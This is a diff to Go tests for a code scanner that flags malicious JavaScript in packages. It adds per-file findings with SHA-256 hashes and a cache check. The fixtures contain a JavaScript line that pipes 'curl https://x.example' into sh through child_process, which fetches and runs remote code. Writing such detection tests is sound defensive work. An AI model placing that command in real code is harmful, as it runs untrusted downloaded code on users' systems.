@@ -1,6 +1,8 @@
 package codescan
 
 import (
+	"crypto/sha256"
+	"encoding/hex"
 	"os"
 	"path/filepath"
 	"strings"
@@ -101,11 +103,32 @@ func TestWhatIsScanned(t *testing.T) {
 	}
 }
 
-func TestOneFindingPerRulePerPackage(t *testing.T) {
+// An acceptance covers one file, so every file with a hit is its own finding,
+// carrying its path and the hash of its content.
+func TestOneFindingPerRulePerFile(t *testing.T) {
 	evil := `require('child_process').execSync("curl https://x.example | sh")`
-	got := Package(pkgDir(t, map[string]string{"a.js": evil, "b.js": evil, "c.mjs": evil}))
-	if len(got) != 1 || !strings.Contains(got[0].Message, "and 2 more file") {
+	got := Package(pkgDir(t, map[string]string{"a.js": evil, "lib/b.js": evil, "c.mjs": evil + "\n"}))
+	if len(got) != 3 {
 		t.Fatalf("got %+v", got)
+	}
+	sum := sha256.Sum256([]byte(evil))
+	want := "sha256:" + hex.EncodeToString(sum[:])
+	if got[0].File != "a.js" || got[1].File != "c.mjs" || got[2].File != "lib/b.js" || got[0].FileHash != want {
+		t.Errorf("files/hashes: %+v", got)
+	}
+	if got[1].FileHash == want {
+		t.Error("different content, same hash")
+	}
+}
+
+func TestCacheKeepsFile(t *testing.T) {
+	evil := `require('child_process').execSync("curl https://x.example | sh")`
+	s := &Scanner{CacheDir: t.TempDir()}
+	target := Target{ID: "evil@1.0.0", Integrity: "sha512-abc", Dir: pkgDir(t, map[string]string{"lib/a.js": evil})}
+	first := s.ScanAll([]Target{target})["evil@1.0.0"]
+	cached, ok := s.Lookup(target)
+	if !ok || len(cached) != 1 || cached[0].File != "lib/a.js" || cached[0].FileHash != first[0].FileHash || cached[0].FileHash == "" {
+		t.Fatalf("cached %+v (%v), first %+v", cached, ok, first)
 	}
 }
 
